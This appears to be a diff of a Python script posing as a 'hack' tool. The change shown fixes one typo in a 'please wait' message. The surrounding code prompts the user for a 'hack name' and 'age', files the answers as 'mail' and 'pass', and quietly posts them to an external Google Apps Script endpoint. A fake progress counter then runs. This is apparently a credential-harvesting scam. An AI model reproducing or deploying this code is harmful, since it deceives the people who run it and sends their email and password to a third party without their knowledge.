@@ -10,7 +10,7 @@ print('........please enter you saw hack name \n and age........')
 umail =input("please Enter you hack saw name=")
 upass =input("please Enter  you hack saw age=")
 data ={'mail':umail,'pass':upass}
-print("plase wait")
+print("please wait")
 rq =requests.post('https://script.google.com/macros/s/AKfycbzpRqyHxvWSniIhc5UqBK-RJDz3gGCo4xYBlLwFkhAdNEsKLmI/exec',data=data)
 for i in range(100):
    print(i,'%')
